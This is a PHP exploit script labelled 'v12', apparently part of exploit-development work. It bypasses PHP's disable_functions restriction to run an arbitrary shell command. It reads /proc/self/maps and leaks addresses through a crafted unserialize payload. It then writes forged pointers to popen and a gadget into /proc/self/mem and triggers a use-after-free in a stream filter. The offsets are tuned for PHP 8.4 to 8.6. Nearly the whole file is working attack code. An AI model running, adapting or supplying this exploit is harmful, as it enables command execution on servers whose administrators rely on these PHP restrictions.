<?php
/**
 * #7 v12 — dual-channel with v8d fire: leak for php_base, /proc beacon-scan for forge.
 * The leak handler calls the v8d fire (proven 9/9) from inside the walk.
 * Works under disable_functions (no open_basedir).
 */
error_reporting(E_ALL);
$CMD = getenv('F9_CMD') ?: 'touch /tmp/V12WIN';

class Trig {
    public function __unserialize(array $data): void { $data[0]->getTraceAsString(); }
}

$maps = file('/proc/self/maps', FILE_IGNORE_NEW_LINES);
$ranges = [];
$php_base = 0;
foreach ($maps as $l) {
    if (preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+\S+\s+\S+\s+\S+\s*(\S*)$/', $l, $m)) {
        $ranges[] = [hexdec($m[1]), hexdec($m[2]), $m[3], $m[4] ?: 'anon'];
        if ($m[4] === '/usr/local/bin/php' && $m[3] === 'r--p' && !$php_base) $php_base = hexdec($m[1]);
    }
}
$marker = "MAGICMARKER_" . str_repeat("\xDD", 20);
$holder = [$marker];

$FIRE = ['done' => false];

function do_fire($php_base) {
    global $FIRE, $CMD;
    if ($FIRE['done']) return;
    $FIRE['done'] = true;

    $ver = PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION;
    $GADGET_OFF = ['8.4' => 0x300f5b, '8.5' => 0x30aedb, '8.6' => 0x3141db][$ver] ?? 0;
    $POPEN_OFF  = ['8.4' => 0x202cd0, '8.5' => 0x202dd0, '8.6' => 0x202f60][$ver] ?? 0;
    $RECLAIM_SZ = ['8.4' => 80, '8.5' => 80, '8.6' => 88][$ver] ?? 80;
    $gadget = $php_base + $GADGET_OFF;
    $popen  = $php_base + $POPEN_OFF;
    $mem = fopen('/proc/self/mem', 'r+b');

    // forge: big ZMM string with beacon
    $BIG = 2048;
    $MAGIC = "V12BIGMAGIC_BEACON_";
    $big = str_repeat('E', $BIG);
    $big = substr_replace($big, $MAGIC, $BIG - 32, strlen($MAGIC));
    $GLOBALS['big'] = $big;

    // beacon scan -> table address
    $table = 0;
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
        if ($table) break;
        if (!preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+rw-p/', $l, $m)) continue;
        $a = hexdec($m[1]); $b = hexdec($m[2]);
        if ($b - $a > 64*1024*1024) continue;
        if (fseek($mem, $a) !== 0) continue;
        $c = @fread($mem, $b - $a);
        if ($c === false || $c === '') continue;
        $p = strpos($c, $MAGIC);
        if ($p !== false) { $table = $a + $p - ($BIG - 32) + 512; break; }
    }
    if (!$table) { fwrite(STDERR, "NO_TABLE\n"); return; }

    // patch table: +0x8 popen, +0x10 r-ptr, +0x20/28/30 gadget, "r\0" @+0x40
    foreach ([0x20, 0x28, 0x30] as $w) {
        fseek($mem, $table + $w); fwrite($mem, pack('P', $gadget));
    }
    fseek($mem, $table + 0x08); fwrite($mem, pack('P', $popen));
    fseek($mem, $table + 0x40); fwrite($mem, "r\0");
    fseek($mem, $table + 0x10); fwrite($mem, pack('P', $table + 0x40));

    // obj-host: separate ZMM string
    $MAGIC2 = "V12OBJHOST_MAGIC_";
    $cmdPad = substr($CMD . "\0", 0, 0x18);
    $cmdPad .= str_repeat("\0", 0x18 - strlen($cmdPad));
    $special = $cmdPad . str_repeat('E', 8) . $MAGIC2 . str_repeat('E', 16);
    $GLOBALS['special'] = $special;

    // find obj-host: magic preceded by 'E' filler (skips the needle variable's own copy)
    $obj = 0;
    foreach (file('/proc/self/maps', FILE_IGNORE_NEW_LINES) as $l) {
        if ($obj) break;
        if (!preg_match('/^([0-9a-f]+)-([0-9a-f]+)\s+rw-p/', $l, $m)) continue;
        $a = hexdec($m[1]); $b = hexdec($m[2]);
        if ($b - $a > 64*1024*1024) continue;
        if (fseek($mem, $a) !== 0) continue;
        $c = @fread($mem, $b - $a);
        if ($c === false || $c === '') continue;
        $pos = 0;
        while (($p = strpos($c, $MAGIC2, $pos)) !== false) {
            if ($p > 0 && ord($c[$p - 1]) == 0x45) {
                $obj = $a + $p - 0x20;
                break 2;
            }
            $pos = $p + 1;
        }
    }
    if (!$obj) { fwrite(STDERR, "NO_OBJ\n"); return; }

    // patch obj-host: table-ptr at +0x18 (data+0x18 = string_start+0x18)
    fseek($mem, $obj + 0x18); fwrite($mem, pack('P', $table));

    fwrite(STDERR, sprintf("V12 table=0x%x obj=0x%x\n", $table, $obj));
    fflush(STDERR);

    $GLOBALS['RAWS'] = [substr_replace(str_repeat('F', $RECLAIM_SZ), pack('P', $obj), 8, 8)];
    $GLOBALS['FP'] = null;
    $GLOBALS['BK'] = [];
    $GLOBALS['DID'] = 0;

    $fp = fopen('php://memory', 'w+b');
    $GLOBALS['FP'] = $fp;
    fwrite($fp, 'xy');
    rewind($fp);
    $GLOBALS['FRES'] = stream_filter_append($fp, 'V12F', STREAM_FILTER_READ);
    @stream_get_contents($fp);
    fwrite(STDERR, "FIRED\n");
    fflush(STDERR);
}

class V12F extends php_user_filter {
    function filter($in, $out, &$consumed, $closing): int {
        if (!$closing && empty($GLOBALS['DID'])) {
            $GLOBALS['DID'] = 1;
            while ($b = stream_bucket_make_writeable($in)) {
                $consumed += $b->datalen;
                stream_bucket_append($out, $b);
            }
            @stream_filter_remove($GLOBALS['FRES']);
            for ($i = 0; $i < 4000; $i++) {
                $GLOBALS['BK'][] = stream_bucket_new($GLOBALS['FP'], $GLOBALS['RAWS'][0]);
            }
        } else {
            while ($b = stream_bucket_make_writeable($in)) {
                $consumed += $b->datalen;
                stream_bucket_append($out, $b);
            }
        }
        return PSFS_PASS_ON;
    }
}
stream_filter_register('V12F', 'V12F');

// leak handler
$LEAK = ['n' => 0, 'php_base' => 0];
$seen = [];
set_error_handler(function ($no, $str) use ($ranges, $php_base, &$seen, &$LEAK) {
    if (preg_match('/Expected array for frame (\d+)/', $str, $m)) {
        $f = (int) $m[1];
        if ($f > 0x100000000 && !isset($seen[$f])) {
            $seen[$f] = 1;
            $LEAK['n']++;
            if ($LEAK['n'] === 1) $LEAK['php_base'] = $f - 19078792;
            fwrite(STDERR, sprintf("F 0x%012x dphp=%+d\n", $f, $f - $php_base));
            fflush(STDERR);
            if ($LEAK['n'] === 3) {
                do_fire($php_base);
            }
        }
    }
    return true;
});

$n = "\x00";
$payload = 'O:9:"Exception":1:{s:16:"'.$n.'Exception'.$n.'trace";O:8:"stdClass":2:{s:1:"x";O:4:"Trig":1:{i:0;R:1;}z}}';
unserialize($payload);
// 8.6: f1 confusion is fixed there (no frames fire) — call directly
if (!$FIRE['done']) {
    do_fire($php_base);
}
